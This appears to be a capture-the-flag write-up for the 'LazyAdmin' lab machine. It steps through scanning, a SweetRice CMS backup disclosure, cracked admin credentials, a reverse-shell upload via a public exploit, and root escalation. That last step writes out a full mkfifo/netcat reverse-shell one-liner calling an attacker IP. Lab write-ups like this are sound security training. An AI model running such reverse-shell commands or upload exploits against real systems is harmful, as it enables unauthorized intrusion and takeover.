# LazyAdmin

## Scanning 

`sudo nmap -sC -sV -oN nmap/initial 10.10.137.142 -v`

`gobuster dir -u 0.10.137.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`


### Open ports

```
22
80
```

## Users


```
manager:Password123 -> creds of http://10.10.137.142/content/as/
```


## Endpoints
```
http://10.10.137.142/content -> is running Basic-CMS (SweetRice)
http://10.10.137.142/content/inc/mysql_backup/ -> mysql backup, (SweetRice 1.5.1 - Backup Disclosure)
http://10.10.137.142/content/as/ -> admin login
http://10.10.137.142/content/inc/lastest.txt -> shows SweetRice version
```



## Notes

* Found SweetRice Basic-CMS running in `/content`

* Found mysql_backup in `http://10.10.137.142/content/inc/mysql_backup/`

* Found admin login in `http://10.10.137.142/content/as/`

* Found has in `mysql_backup` and hashcat cracked the hash

![image](https://user-images.githubusercontent.com/12052283/131159165-4e0342ed-ad9a-410c-a712-8a00b8f4cffe.png)


![image](https://user-images.githubusercontent.com/12052283/131159104-d4ebad00-77fb-470e-8dd0-5d9bbaad97b4.png)

* Logged in in `http://10.10.137.142/content/as/` with `manager:Password123`

* Could not upload shell using `exploit.py`

* Using `https://www.exploit-db.com/exploits/40700` I was able to create a Ads , upload a rev shell and check that Ads in `content/inc/ads/`

![image](https://user-images.githubusercontent.com/12052283/131162704-6e1f808e-5b9f-49f7-847c-c82306ec3a37.png)

* Found random mysql creds

![image](https://user-images.githubusercontent.com/12052283/131163206-babaef7d-160b-4c0d-8966-d2172003d10b.png)

* Running `sudo -l`

![image](https://user-images.githubusercontent.com/12052283/131165373-46cc1ecd-8c3f-42bb-9bdb-37d203f80920.png)

* To edit the `/etc/copy.sh` I did `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.149.54 5554 >/tmp/f` since we dont have permissions to use nano and vim and got root

![image](https://user-images.githubusercontent.com/12052283/131166062-1a1a396a-6adb-4431-aa5d-eb1bfa28b4e1.png)



# References

* https://www.exploit-db.com/
